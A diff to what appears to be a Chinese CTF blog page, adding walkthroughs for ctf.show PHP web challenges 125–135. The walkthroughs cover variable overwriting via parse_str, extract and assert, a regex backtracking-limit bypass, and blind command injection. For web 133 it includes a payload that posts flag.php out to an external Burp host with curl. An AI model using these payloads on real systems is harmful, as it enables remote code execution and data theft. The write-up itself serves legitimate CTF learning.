@@ -1012,7 +1012,65 @@
 <h3 id="web-123"><a href="#web-123" class="headerlink" title="web 123"></a>web 123</h3><p>php的变量名是只能有数字字母下划线的，其中的<code>空格 + [ .</code>会被替换成下划线，但是有一个特性可以变量里面出现<code>.</code>那就是<code>[</code>这个符号出现之后被替换成下划线但是后面的符号是不会被替换的，后面的点也就会维持原样</p>
 <p>CTF_SHOW.COM =&gt;CTF[SHOW.COM=&gt;CTF_SHOW.COM</p>
 <p>然后进入eval($c.’;’)，没有任何过滤直接<code>echo $flag</code></p>
-<h3 id="web-125"><a href="#web-125" class="headerlink" title="web 125"></a>web 125</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
+<h3 id="web-125"><a href="#web-125" class="headerlink" title="web 125"></a>web 125</h3><p>没有过滤highlight_file，给fun一个get传参，然后gei传入一个flag.php</p>
+<h3 id="web-126"><a href="#web-126" class="headerlink" title="web 126"></a>web 126</h3><p><code>$a=$_SERVER[&#39;argv&#39;];</code>这个函数在我们输入参数时进行记录或者覆盖</p>
+<p>比如：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">a=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span></span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">a);</span></span><br><span class="line"><span class="meta">#</span><span class="bash">var_dump(get_defined_vars());</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当我们直接传入参数时她会记录在数组中</p>
+<p>比如我们传入aaa=bbb时她会返回<code>array(1) &#123; [0]=&gt; string(7) &quot;aaa=bbb&quot; &#125;</code></p>
+<p>这样我们就可以将其分割成数组形式进行变量覆盖parse_str进行分割</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload</span><br><span class="line">get：?c=1+fl0g=flag_give_me</span><br><span class="line">post:CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=parse_str($a[1])</span><br><span class="line">或者直接用assert也行</span><br><span class="line">get:?$fl0g=flag_give_me</span><br><span class="line">post:CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=assert($a[0])</span><br><span class="line">因为assert中传入字符串是会当作代码执行，也就是说我们直接把flag_give_me赋值给了fl0g</span><br></pre></td></tr></table></figure>
+
+<h3 id="web-127"><a href="#web-127" class="headerlink" title="web 127"></a>web 127</h3><p>fuzz一下看一下没有被过滤的字符</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">space % &amp; 0 1 2 3 4 5 6 7 8 9 = ? A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z | </span><br></pre></td></tr></table></figure>
+
+<p>我们需要构造覆盖，但是下划线被过滤了，我们知道有几个字符在get传参是会自动转换成下划线<code>space [ . + </code></p>
+<p>而且后面三个都被过滤了所以用空格就行</p>
+<h3 id="web-128"><a href="#web-128" class="headerlink" title="web 128"></a>web 128</h3><p>学到一个骚姿势：</p>
+<p>gettext()    或者_()</p>
+<p>她会实现程序的国际化：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假如你的没有国际化的程序里有这样的代码，echo &quot;你好&quot;;,而国际化的程序你要写成 echo gettext(&quot;你好&quot;);，然后再在配置文件里添加“你好”相对应的英文“Hi”。</span><br><span class="line">这时，中国地区浏览都会在屏幕上输出“你好”，而美国地区浏览都会在屏幕上输出“Hi”。也就是说，最终显示什么是根据你的配置文件而定的，如果找不到配置文件，才会输出程序里面的内容。</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就可以查看后面文件中的内容</p>
+<p>_(get_defined_vars之后就会变成</p>
+<p>call_user_func(get_defind_vars)直接会返回已经定义的变量数组</p>
+<h3 id="web-129"><a href="#web-129" class="headerlink" title="web 129"></a>web 129</h3><p>题目得到意思是我们输入的f里面一定要包含ctfshow而且不能在第一位，而且运用的是readfile函数，那么我们就可以想到这个题目意思应该是我们需要猜测flag所在目录，因为必须要包含ctfshow，那么就应该是有一个ctfshow文件夹的存在，我们直接退出目录然后从根目录打开/vat/www/html/flag.php</p>
+<h3 id="web-130"><a href="#web-130" class="headerlink" title="web 130"></a>web 130</h3><p>.表示任意单个字符，+表示必须匹配1次或多次，+?表示 重复1次或更多次，但尽可能少重复</p>
+<p>题目的意思应该是ctfshow之前不能存在东西，然后ctfshow必须在我们输入的数的第一位</p>
+<p>直接f=ctfshow</p>
+<h3 id="web-131"><a href="#web-131" class="headerlink" title="web 131"></a>web 131</h3><p>正则匹配的回溯次数有上线，100万，当我们输入的值超过这个值的时候，他就会溢出，返回直接返回false</p>
+<p>也就是说我们在36Dctfshow之前传入一个溢出值，他就会直接绕过第一个正则判断</p>
+<p>也就是输入一百万个字符，我们可以直接用四个字符*250000后面接一个36Dctfshow就可以</p>
+<h3 id="web-132"><a href="#web-132" class="headerlink" title="web 132"></a>web 132</h3><p>&amp;&amp;运算符：全1出1，当左边为0时不计算直接返回0</p>
+<p>题目要code是1到877的随机数，如果直接不管他就会直接进后面的||运算，所以我们只需要username=admin就行了</p>
+<p>进入到下面的一个判断，需要code等于admin，那么我们直接设定code=admin,username=admin,password=1</p>
+<p>就行了</p>
+<h3 id="web-133"><a href="#web-133" class="headerlink" title="web 133"></a>web 133</h3><p>题目的意思是可以执行命令但是没有回显</p>
+<p>我们直接分号截断他的substr就行了</p>
+<p>因为只有6个字符，所以我们可以覆盖</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">f=`$f`;</span><br><span class="line">这样不仅进行了截断还可以继续执行后面我们输入的语句</span><br><span class="line">比如</span><br><span class="line">f=`$f`;+sleep 3;</span><br><span class="line">当我们运行的时候网页确实sleep了</span><br><span class="line">说明我们后面的文件执行了</span><br><span class="line">但是为什么会执行呢</span><br><span class="line">因为我们进行了覆盖</span><br><span class="line">那么现在也就是``$f`; sleep 3;`</span><br><span class="line">``是shell_exec的缩写</span><br><span class="line">也就是shell_exec(`$f`; sleep 3)</span><br><span class="line">前面不用管，后面的函数我们是可以进行控制的</span><br><span class="line">因为他没有回显，我们就可以用反弹shell或者外带的形式，把flag.php给传到我们自己的网站这里来</span><br></pre></td></tr></table></figure>
+
+<p>可以用bp接收</p>
+<p>payload:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">f=`$f`;+curl -X POST -F xx=@flag.php http://+bp给的网址</span><br></pre></td></tr></table></figure>
+
+<p>详细操作：</p>
+<p><img src="/2022/02/22/ctf-show/web133_1.png" alt="1"></p>
+<p><img src="/2022/02/22/ctf-show/web133_2.png" alt="1"></p>
+<p><img src="/2022/02/22/ctf-show/web133_3.png" alt="1"></p>
+<p>拿到flag.php文件</p>
+<h3 id="web-134"><a href="#web-134" class="headerlink" title="web 134"></a>web 134</h3><p>由<code>extract（$_POST）</code>以及<code>parse_str($_SERVER[&#39;QUERY_STRING&#39;])</code></p>
+<p>组合成的数组覆盖漏洞</p>
+<p>首先进入题目是get以及post方式都不能传入key1、key2但是下面得判断key1、key2等于36d</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">parse_str — 将字符串解析成多个变量</span><br><span class="line">extract — 从数组中将变量导入到当前的符号表</span><br></pre></td></tr></table></figure>
+
+<p>测试一下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php				url?_POST[key1]=1</span><br><span class="line"><span class="meta">$</span><span class="bash">key1 = 0;</span></span><br><span class="line">echo &quot;&#123;$key1&#125;&quot;;</span><br><span class="line"><span class="meta">@parse_str($</span><span class="bash">_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span></span><br><span class="line">echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">_POST);</span></span><br><span class="line"><span class="meta">#</span><span class="bash">var_dump(get_defined_vars());</span></span><br><span class="line"><span class="meta">extract($</span><span class="bash">_POST);</span></span><br><span class="line">echo &quot;&lt;br /&gt;&#123;$key1&#125;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">array(1) &#123; [&quot;key1&quot;]=&gt; string(1) &quot;1&quot; &#125;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>可以看到第一开始的时候key1是0但是经过下面的分解之后他将我们在url上面赋值的_POST[key1]=1覆盖原本post值的内容，然后对post进行一个extract</p>
+<p>解析成变量名：也就是说我们现在又执行了$key1=1又对key1进行了一次赋值这样可以更改他的值变成36d</p>
+<h3 id="web-135"><a href="#web-135" class="headerlink" title="web 135"></a>web 135</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
 <p>题目的提示：名字就是提示，我们只需要在网页的后面以get方式传入一个值就行了</p>
 <p>既然是ssti那么我们直接测试一下49看一下</p>
 <p>如果返回的是7777777那么就是jinjia2</p>
